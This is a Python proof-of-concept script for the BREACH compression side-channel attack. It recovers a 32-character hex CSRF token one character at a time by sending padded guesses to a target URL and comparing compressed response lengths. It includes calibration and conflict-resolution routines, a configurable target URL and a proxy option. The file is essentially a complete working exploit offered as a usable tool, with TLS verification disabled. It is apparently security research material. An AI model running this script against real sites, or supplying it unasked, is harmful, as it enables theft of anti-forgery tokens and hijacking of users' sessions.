import requests
import os
import random
import urllib3
import time
import argparse

# Disable insecure https warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Some default settings
PROXY_SETTINGS = {} # Just in case we want to use a proxy (such as Fiddler) to debug
BASE_URL = "https://malbot.net/poc/?request_token='"
SECRET_LENGTH = 32
DICTIONARY = list(map(lambda x: hex(x)[2], range(16))) # All possible 1 hex char combinations
PADDING_CHAR = '@'
# DICTIONARY = list(map(str, range(10))) + ['a', 'b', 'c', 'd', 'e', 'f']

def pad_character(char, pad_len):
    """
    Surrounds the char with some padding to defeat Huffman Coding induced problems
    """
    # TODO(Alvaro): implement this better
    random_padding = '@' * pad_len
    
    rest_dictionary = '_'.join(filter(lambda x: x != char, DICTIONARY))
    
    return char + random_padding + "---" + rest_dictionary + '@@@@'
    

def get_request_length(url):
    # TODO(Alvaro): Review how this might be implemented from the perspective of an eavesdropper
    res_stream = requests.get(url, stream=True, proxies=PROXY_SETTINGS, verify=False)
    raw_bytes = res_stream.raw.read()
    return len(raw_bytes)

   
def calibrate(curr, pad_len, char1=DICTIONARY[0], char2=DICTIONARY[1]):
    """
    To calibrate (establish the baseline for the current value of the guess), we need to send the first
    2 guesses and compare them, there are 2 possible situations:
      - If the length of both guesses is the same, that means that they are both wrong, or both are candidates, but we
      have a baseline value for the wrong guess' lenght
      - If the length is different, that means that we already have a possible candidate, and a baseline length
    """
    url_1 = BASE_URL + curr + pad_character(char1, pad_len)
    len_1 = get_request_length(url_1)
    url_2 = BASE_URL + curr + pad_character(char2, pad_len)
    len_2 = get_request_length(url_2)
    
    if len_1 == len_2:
        # Both are wrong, or possible candidates, so we use it as baseline
        return [char1, char2], len_1
    elif len_1 < len_2:
        # guess1 is the correct one, we set it as new baseline
        # print(f'len_1={len_1}, len_2={len_2}')
        return [char1], len_1
    else:
        # guess2 is the correct one, we set it as new baseline
        # print(f'len_1={len_1}, len_2={len_2}')
        return [char2], len_2

def solve_conflict(curr, conflicted):
    # Try different pad_lengths   
    for iter_count in range(10): # Loop to avoid infinite loops in case of error
        next_len = random.randint(10, 100)
        candidates, baseline = calibrate(curr, next_len, char1=conflicted[0], char2=conflicted[1])
        print(f'Solving conflict for curr = {curr} ; conflicted = {conflicted} ; trying with pad_len = {next_len}')
        
        for char in conflicted[2:]:
            next_url = BASE_URL + curr + pad_character(char, next_len)
            res_length = get_request_length(next_url)
            
            # Logic to decide whether this char is the best or not 
            if res_length < baseline: 
                # Baseline was wrong, reset results
                candidates = [char]
                baseline = res_length
            elif res_length == baseline:
                # This is a possible candidate
                candidates.append(char)
                
        if len(candidates) == 1:
            # Conflict solved!
            next_guess = curr + candidates[0]
            print(f'Guessed next character! (char = {candidates[0]}), new full guess is: {next_guess}')
            return next_guess
        elif len(candidates) > 1:
            # The conflic was not resolved in this iteration... try again
            conflicted = candidates
        else:
            # This should never happen...
            print(f'ERROR! solving the conflict, the candidates\'s length was negative...')
            
    print(f'ERROR! The conflict could not be resolved, left candidates = {candidates}')
    return
    
def guess_next_char(curr, pad_len=40):
    """
    Tries every possible request combinating the current guess with a char from the
    dictionary, making a request and comparing the length of the body with a previous baseline.
    
    Initially the baseline length is unknown, so at least 2 tries are necessary to establish a baseline. 
    """
    candidates, baseline = calibrate(curr, pad_len)
    
    for char in DICTIONARY[2:]:
        next_url = BASE_URL + curr + pad_character(char, pad_len)
        res_length = get_request_length(next_url)
        
        # Logic to decide whether this char is the best or not 
        if res_length < baseline: 
            # Baseline was wrong, reset results
            candidates = [char]
            baseline = res_length
        elif res_length == baseline:
            # This is a possible candidate
            candidates.append(char)
    
    # Finished
    if len(candidates) == 1:
        # We have a winner!
        next_guess = curr + candidates[0]
        print(f'Guessed next character! (char = {candidates[0]}), new full guess is: {next_guess}')
        return next_guess
    elif len(candidates) > 1:
        # We have conflicts... solve them!:
        return solve_conflict(curr, candidates)
    else: # Should not happen...
        print(f'ERROR! For the current result: {curr}, the was no candidates found!')
        return

# 2 Tries implementation to compare
# NOT USED AND NOT FUNCTIONAL
def pad_character_2_tries(char, first=True):
    random_padding = "@" * 10
        
    return char + random_padding if first else random_padding + char 
    
# NOT USED AND NOT FUNCTIONAL
def guess_next_char_2_tries(curr):
    """
    Tries every possible request combinating the current guess with a char from the
    dictionary, making a request and comparing the length of the body with a previous baseline.
    
    Initially the baseline length is unknown, so at least 2 tries are necessary to establish a baseline. 
    """
    for char in DICTIONARY:
        # 2 Tries
        url_1 = BASE_URL + curr + pad_character_2_tries(char)
        len_1 = get_request_length(url_1)
        url_2 = BASE_URL + curr + pad_character_2_tries(char, first=False)
        len_2 = get_request_length(url_2)
        
        # Logic to decide whether this char is the best guess or not 
        if len_1 < len_2:
            # SUCCESS! THIS IS THE CHARACTER
            next_guess = curr + char
            print(f'Guessed next character! (char = {char}), new full guess is: {next_guess}')
            return next_guess
        elif len_1 > len_2:
            # Should not happen?
            print(f'Ugh! len_1 < len_2! ({len_1} < {len_2})')
            return
        else:
            # This isn't it, try the next one
            continue

# MAIN
def main():
    init = time.time()
    current_guess = ""
    # Watch end condition... for now we presume we know the expected length of the secret
    for _ in range(SECRET_LENGTH):
        next_guess = guess_next_char(current_guess)
        if next_guess is None:
            # Something went wrong and could not guess next char
            print(f'Whoops... no guess was found with the current_guess = {current_guess}')
            break
        else:
            current_guess = next_guess

    end = time.time()
    print(f'The CSRF token is: ' + current_guess)
    print(f'It took {end - init} seconds to break the token')
    print('For a 11x faster implementation (parallelizing requests), try breach-parallel.py')

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='This is an POC implementation (simplified) of the BREACH Attack',
                                     formatter_class=argparse.RawTextHelpFormatter,
                                     epilog='''
This implementation guesses a secret, one character at a time, and for every character,
tries all posible hex characters and selects the one that produces the shortest response.
To reduce the effect of Huffman Coding on the oracle, we use padding and append the dictionary
at the end of every request. To solve conflicts, we re-try the conflicted characters with a
new random padding length.
For a faster implementation, try `breach-parallel.py`.

Authors:
    - Carlos Santamaría
    - Irene Quintana
    - Guillermo Fernandez 
    - Alvaro Clemente
''')

    parser.add_argument('-p', '--proxy', action='store_true',
            help='''Use the internal proxy to inspect on fiddler. The proxies by default are:
"http://127.0.0.1:8888"
"https://127.0.0.1:8888"''')
    parser.add_argument('--padding', type=str, default='@',
            help="Use a custom character or string to pad the requests. The default is '@'")
    parser.add_argument('-u','--url', type=str, default=BASE_URL,
            help=f'Change the base url of the attack. The default is: "{BASE_URL}"')

    # Process the args
    args = parser.parse_args()
    if args.proxy:
        # So that python request go through Fiddler
         PROXY_SETTINGS = {  
             "http": "http://127.0.0.1:8888",
             "https": "https://127.0.0.1:8888"
         }
    if args.padding != '@':
        PADDING_CHAR = args.padding

    if args.url != BASE_URL:
        # Update the base url for the attack
        BASE_URL = args.url
    
    #Run main
    main()

